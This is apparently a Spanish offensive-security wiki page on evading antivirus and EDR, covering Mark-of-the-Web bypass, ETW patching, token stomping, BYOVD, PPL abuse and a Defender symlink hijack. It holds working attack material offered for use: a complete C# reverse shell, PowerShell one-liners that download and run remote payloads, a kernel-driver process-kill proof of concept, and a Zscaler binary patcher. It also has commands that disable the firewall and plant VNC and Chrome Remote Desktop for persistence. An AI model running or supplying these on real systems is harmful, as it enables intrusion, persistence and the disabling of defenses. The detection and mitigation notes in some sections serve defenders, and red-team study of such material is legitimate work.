**MoTW** (Mark of The Web) es un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con el nombre Zone.Identifier que se crea automáticamente al descargar archivos de Internet, junto con la URL desde la que se descargaron.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Comprobación del ADS Zone.Identifier de un archivo descargado de Internet.</p></figcaption></figure>

> [!TIP]
> Es importante tener en cuenta que los ejecutables firmados con un certificado de firma **de confianza** **no activarán SmartScreen**.

Una forma muy eficaz de evitar que tus payloads reciban el Mark of The Web es empaquetarlos dentro de algún tipo de contenedor, como una ISO. Esto ocurre porque Mark-of-the-Web (MOTW) **no puede** aplicarse a volúmenes **que no sean NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Uso de ejemplo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí tienes una demostración para evadir SmartScreen empaquetando payloads dentro de archivos ISO mediante [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de logging en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser utilizado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De forma similar a cómo se deshabilita (evade) AMSI, también es posible hacer que la función **`EtwEventWrite`** del proceso en user space retorne inmediatamente sin registrar ningún evento. Esto se realiza parcheando la función en memoria para que retorne inmediatamente, deshabilitando eficazmente el logging de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) y [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

La carga de binarios C# en memoria se conoce desde hace bastante tiempo y sigue siendo una excelente forma de ejecutar tus herramientas de post-exploitation sin ser detectado por el AV.

Dado que el payload se cargará directamente en memoria sin tocar el disco, solo tendremos que preocuparnos de parchear AMSI para todo el proceso.

La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya ofrecen la capacidad de ejecutar C# assemblies directamente en memoria, pero existen distintas formas de hacerlo:

- **Fork\&Run**

Consiste en **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-exploitation en ese nuevo proceso, ejecutar tu código malicioso y, al terminar, finalizar el nuevo proceso. Esto tiene ventajas y desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** de nuestro proceso de Beacon implant. Esto significa que, si algo sale mal o es detectado durante nuestra acción de post-exploitation, existe una **probabilidad mucho mayor** de que nuestro **implant sobreviva.** La desventaja es que tienes una **mayor probabilidad** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste en inyectar el código malicioso de post-exploitation **en su propio proceso**. De esta forma, puedes evitar tener que crear un proceso nuevo y que el AV lo analice, pero la desventaja es que, si algo sale mal durante la ejecución de tu payload, existe una **probabilidad mucho mayor** de **perder tu beacon**, ya que podría bloquearse.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre la carga de C# assemblies, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **desde PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y el [vídeo de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso utilizando otros lenguajes proporcionando a la máquina comprometida acceso **al entorno del intérprete instalado en el Attacker Controlled SMB share**.

Al permitir el acceso a los Interpreter Binaries y al entorno en el SMB share, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repositorio indica: Defender sigue analizando los scripts, pero al utilizar Go, Java, PHP, etc., tenemos **más flexibilidad para evadir firmas estáticas**. Las pruebas con reverse shell scripts aleatorios y no ofuscados en estos lenguajes han demostrado ser exitosas.

## TokenStomping

Token stomping es una técnica que permite a un atacante **manipular el access token o un producto de seguridad como un EDR o AV**, permitiéndole reducir sus privilegios para que el proceso no muera, aunque tampoco tenga permisos para comprobar si existen actividades maliciosas.

Para evitarlo, Windows podría **impedir que procesos externos** obtengan handles sobre los tokens de los procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**esta publicación**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es sencillo desplegar Chrome Remote Desktop en el PC de una víctima y utilizarlo para tomar el control y mantener la persistencia:
1. Descarga desde https://remotedesktop.google.com/, haz clic en "Set up via SSH" y, a continuación, haz clic en el archivo MSI de Windows para descargarlo.
2. Ejecuta el instalador silenciosamente en la víctima (se requieren permisos de administrador): `msiexec /i chromeremotedesktophost.msi /qn`
3. Regresa a la página de Chrome Remote Desktop y haz clic en next. El asistente te pedirá autorización; haz clic en el botón Authorize para continuar.
4. Ejecuta el parámetro proporcionado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Ten en cuenta el parámetro pin, que permite establecer el pin sin utilizar la GUI).


## Advanced Evasion

La evasión es un tema muy complicado; a veces tienes que considerar muchas fuentes de telemetría diferentes en un mismo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propios puntos fuertes y débiles.

Te recomiendo encarecidamente ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94) para obtener una base sobre técnicas más Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra excelente charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes utilizar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **eliminará partes del binario** hasta **averiguar qué parte considera maliciosa Defender** y te la separará.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred), con una oferta web abierta del servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows10, todas las versiones de Windows incluían un **Telnet server** que podías instalar (como administrador) ejecutando:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** cuando se inicie el sistema y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto de telnet (stealth) y deshabilitar el firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (necesitas las descargas bin, no el setup)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Activa la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Después, mueve el binario _**winvnc.exe**_ y el archivo **UltraVNC.ini** **recién** creado dentro de la **víctima**

#### **Reverse connection**

El **atacante** debe **ejecutar dentro de su host** el binario `vncviewer.exe -listen 5900`, de modo que esté **preparado** para recibir una **conexión VNC** inversa. Después, dentro de la **víctima**: Inicia el daemon de winvnc con `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo, no debes hacer algunas cosas

- No inicies `winvnc` si ya está ejecutándose o activarás un [popup](https://i.imgur.com/1SROTTl.png). Comprueba si está ejecutándose con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o hará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para obtener ayuda o activarás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta el payload xml** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer C# Revershell

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automáticas:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores de C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando Python para crear injectors, ejemplo:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Eliminación de AV/EDR desde el espacio del kernel

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones del endpoint antes de implementar el ransomware. La herramienta incluye su **propio driver vulnerable pero *firmado*** y abusa de él para ejecutar operaciones privilegiadas del kernel que ni siquiera los servicios AV Protected-Process-Light (PPL) pueden bloquear.

Puntos clave
1. **Driver firmado**: el archivo entregado al disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys`, perteneciente al “System In-Depth Analysis Toolkit” de Antiy Labs. Como el driver posee una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalación del servicio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **servicio del kernel** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde user land.
3. **IOCTLs expuestos por el driver**
| Código IOCTL | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario mediante su PID (usado para eliminar servicios de Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario del disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por qué funciona**: BYOVD omite por completo las protecciones de user-mode; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras funciones de hardening.

Detección / Mitigación
•  Habilita la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.
•  Supervisa la creación de nuevos servicios del *kernel* y genera una alerta cuando un driver se carga desde un directorio con permisos de escritura para todos o no está presente en la allow-list.
•  Supervisa los handles de user-mode hacia objetos de dispositivo personalizados, seguidos de llamadas sospechosas a `DeviceIoControl`.

### Bypass de las comprobaciones de postura de Zscaler Client Connector mediante el parcheo de binarios en disco

El **Client Connector** de Zscaler aplica localmente las reglas de postura del dispositivo y depende de Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible un bypass completo:

1. La evaluación de la postura ocurre **enteramente en el cliente** (se envía un booleano al servidor).
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (mediante `WinVerifyTrust`).

Al **parchear cuatro binarios firmados en disco**, ambos mecanismos pueden neutralizarse:

| Binario | Lógica original parcheada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1`, por lo que todas las comprobaciones cumplen |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | Se reemplaza por NOP ⇒ cualquier proceso (incluso uno sin firmar) puede vincularse a las pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Se reemplaza por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad del túnel | Se omiten mediante un salto corto |

Extracto mínimo del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar el stack de servicios:

* **Todas** las comprobaciones de postura muestran **green/compliant**.
* Los binarios sin firma o modificados pueden abrir los endpoints RPC de named pipe (por ejemplo, `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este caso de estudio demuestra cómo las decisiones de confianza exclusivamente del lado del cliente y las comprobaciones de firma simples pueden evadirse con unos pocos parches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) aplica una jerarquía de signer/level para que solo los procesos protegidos con un nivel igual o superior puedan manipularse entre sí. Desde el punto de vista ofensivo, si puedes iniciar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir una funcionalidad benigna (por ejemplo, el logging) en una primitiva de escritura restringida y respaldada por PPL contra directorios protegidos utilizados por AV/EDR.

What makes a process run as PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess utilizando los flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Debe solicitarse un protection level compatible que coincida con el signer del binario (por ejemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para anti-malware signers, `PROTECTION_LEVEL_WINDOWS` para Windows signers). Los niveles incorrectos harán que la creación falle.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario de sistema firmado `C:\Windows\System32\ClipUp.exe` se inicia a sí mismo y acepta un parámetro para escribir un archivo de log en una ruta especificada por el caller.
- Cuando se inicia como un proceso PPL, la escritura del archivo se realiza con respaldo de PPL.
- ClipUp no puede analizar rutas que contengan espacios; utiliza rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio principal.
- Derivar la ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicia el LOLBIN con capacidad PPL (ClipUp) usando un launcher (por ejemplo, CreateProcessAsPPL) con `CREATE_PROTECTED_PROCESS`.
2) Pasa el argumento de ruta del log de ClipUp para forzar la creación de un archivo en un directorio de AV protegido (por ejemplo, Defender Platform). Utiliza nombres cortos 8.3 cuando sea necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (por ejemplo, MsMpEng.exe), programa la escritura durante el arranque, antes de que se inicie el AV, instalando un servicio de inicio automático que se ejecute de forma fiable antes. Valida el orden de arranque con Process Monitor (boot logging).
4) Tras reiniciar, la escritura respaldada por PPL se realiza antes de que el AV bloquee sus binarios, lo que corrompe el archivo objetivo e impide el inicio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que escribe ClipUp más allá de su ubicación; la primitive es adecuada para la corrupción, no para la inyección precisa de contenido.
- Requiere permisos de administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El timing es crítico: el objetivo no debe estar abierto; la ejecución durante el arranque evita los bloqueos de archivos.

Detecciones
- Creación del proceso de `ClipUp.exe` con argumentos inusuales, especialmente cuando el proceso padre es un launcher no estándar, cerca del arranque.
- Nuevos servicios configurados para iniciar automáticamente binarios sospechosos y que se inician sistemáticamente antes que Defender/AV. Investiga la creación/modificación de servicios antes de los fallos de inicio de Defender.
- Monitorización de la integridad de archivos en los binarios/directorios de Platform de Defender; creaciones/modificaciones inesperadas por procesos con flags de protected-process.
- Telemetría ETW/EDR: busca procesos creados con `CREATE_PROTECTED_PROCESS` y un uso anómalo del nivel PPL por parte de binarios que no sean de AV.

Mitigaciones
- WDAC/Code Integrity: restringe qué binarios firmados pueden ejecutarse como PPL y bajo qué procesos padre; bloquea la invocación de ClipUp fuera de contextos legítimos.
- Service hygiene: restringe la creación/modificación de servicios de inicio automático y monitoriza la manipulación del orden de inicio.
- Asegúrate de que tamper protection de Defender y las protecciones de early-launch estén habilitadas; investiga los errores de inicio que indiquen corrupción de binarios.
- Considera deshabilitar la generación de nombres cortos 8.3 en los volúmenes que alojan herramientas de seguridad si es compatible con tu entorno (pruébalo exhaustivamente).

Referencias sobre PPL y tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender elige la plataforma desde la que se ejecuta enumerando las subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (por ejemplo, `4.18.25070.5-0`) y, a continuación, inicia desde allí los procesos del servicio de Defender (actualizando las rutas del servicio/registro según corresponda). Esta selección confía en las entradas de directorio, incluidos los directory reparse points (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por el atacante y lograr DLL sideloading o una interrupción del servicio.

Requisitos previos
- Administrador local (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Capacidad para reiniciar o activar la re-selección de la plataforma de Defender (reinicio del servicio durante el arranque)
- Solo se requieren herramientas integradas (mklink)

Por qué funciona
- Defender bloquea las escrituras en sus propias carpetas, pero su selección de plataforma confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino se resuelva en una ruta protegida/de confianza.

Paso a paso (ejemplo)
1) Prepara un clon escribible de la carpeta de la plataforma actual, por ejemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un enlace simbólico de directorio de una versión superior dentro de Platform que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del trigger (se recomienda reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifica que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Debes observar la nueva ruta del proceso bajo `C:\TMP\AV\` y la configuración del servicio/registro reflejando esa ubicación.

Opciones de post-explotación
- DLL sideloading/ejecución de código: Coloca o reemplaza DLLs que Defender carga desde su directorio de aplicación para ejecutar código en los procesos de Defender. Consulta la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Detención/denegación del servicio: Elimina el symlink de versión para que, en el siguiente inicio, la ruta configurada no se resuelva y Defender no pueda iniciarse:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Ten en cuenta que esta técnica no proporciona escalada de privilegios por sí sola; requiere derechos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Los Red teams pueden trasladar la evasión en tiempo de ejecución fuera del implante C2 y al propio módulo objetivo mediante el hooking de su Import Address Table (IAT) y el enrutamiento de APIs seleccionadas a través de código controlado por el atacante y position-independent (PIC). Esto generaliza la evasión más allá de la pequeña superficie de APIs que exponen muchos kits (por ejemplo, CreateProcessA) y extiende las mismas protecciones a BOFs y post-exploitation DLLs.

Enfoque de alto nivel
- Prepara un blob PIC junto al módulo objetivo mediante un reflective loader (antepuesto o complementario). El PIC debe ser autocontenido y position-independent.
- Cuando se carga la DLL anfitriona, recorre su IMAGE_IMPORT_DESCRIPTOR y modifica las entradas de la IAT correspondientes a las importaciones objetivo (por ejemplo, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para que apunten a wrappers PIC ligeros.
- Cada wrapper PIC ejecuta evasiones antes de hacer tail-call a la dirección de la API real. Entre las evasiones habituales se incluyen:
- Enmascaramiento/desenmascaramiento de memoria alrededor de la llamada (por ejemplo, cifrar regiones del beacon, cambiar de RWX a RX y modificar los nombres/permisos de las páginas), y restauración posterior a la llamada.
- Call-stack spoofing: construye una pila benigna y realiza la transición a la API objetivo para que el análisis del call stack resuelva los frames esperados.
